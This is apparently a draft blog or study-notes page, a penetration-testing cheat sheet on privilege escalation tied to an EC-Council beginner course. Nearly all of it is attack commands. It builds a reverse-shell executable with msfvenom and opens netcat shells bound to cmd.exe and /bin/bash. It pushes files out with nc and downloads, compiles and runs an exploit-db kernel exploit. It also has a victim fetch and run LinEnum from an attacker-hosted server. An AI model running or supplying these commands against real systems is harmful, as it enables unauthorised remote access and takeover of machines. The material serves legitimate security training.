---
title: Privilege Escalation Tools and Techniques
summary: Understand Privilege Escalation and use of tools
description: Understand Privilege Escalation and use of tools
slug: '/privilege-escalation-tool-and-techniques'
tags: ['privilege escalation', 'penetration testing', 'ethical hacking']
draft: true
---

## Reverse Shell

Take advantage of the target system's vulnerabilities to initiate a shell session.

```bash
# Listener is attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<listener-ip-addr> LPORT=<listener-port> -f exe > shell-x64.exe

nc -lvp <listener-port>

# Now, after you download and run the app. We get the access to victim's shell.
```

### WinPEAS

```powershell
WinPEASx65.exe systeminfo log=systeminfo.txt # Privilege Escalation
```

### netcat

#### Windows

```powershell
ncat.exe -lp 52000 # Start listening at port 52000

netstat -an | more

ncat.exe -lp 55555 > alice.txt # If file doesn't exist it will be created else cleared and redirected.
ncat.exe -lp 55555 >> alice.txt # Append in a file instead.

ncat.exe -lp 10314 -e cmd.exe # -e is executable i.e. cmd.exe

ncat.exe <target-linux-ip-addr> 14618 # Bash shell from Linux
```

#### Linux

```bash
nc <target-windows-ip-addr> 52000 # Linux

nc -w 1 <target-windows-ip-addr> 5555 < bob.txt # Send content of the bob.txt file.
# If the connection and stdin are idle for more than timeout seconds, the connection is closed silently.
# Default is no timeout. `nc` will listen forever for a connection, with or without the -w flag.

nc <target-windows-ip-addr> 10314 # Windows prompt from Linux

nc -lp 14618 -e /bin/bash # bash as executable.
```

> Note: `>` is output redirection character, `<` is input redirection character.

## exploit-db.com

Based on Linux kernal, VulnOS -> `37292`

```bash
whoami

wget https://www.exploit-db.com/exploits/44298 -O exploit.c

gcc exploit.c -o exploit
chmod 777 exploit
./exploit

whoami
```

## LinEnum

```bash
# Attacker Server
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O LinEnum # or Copy RAW to to LinEnum file.

chmod +x LinEnum

python -m http.server 8000 # Serving http server to host a file to download.

# Victim Client
wget http://<attacker-ip-addr>:8000/LinEnum

./LinEnum
```

## Gobuster - Directory Traversal

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <target-ip-addr>
```

## Spawning Bash Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' # Pseudo-terminal utilities
```

## Window Remote Management (WinRM)

```bash
evil-winrm -i <target-windows-ip-addr> -u 'admin' -p 'pass'
```

## Reference

- https://github.com/ec-council-learning/Pentesting-Fundamentals-for-Beginners
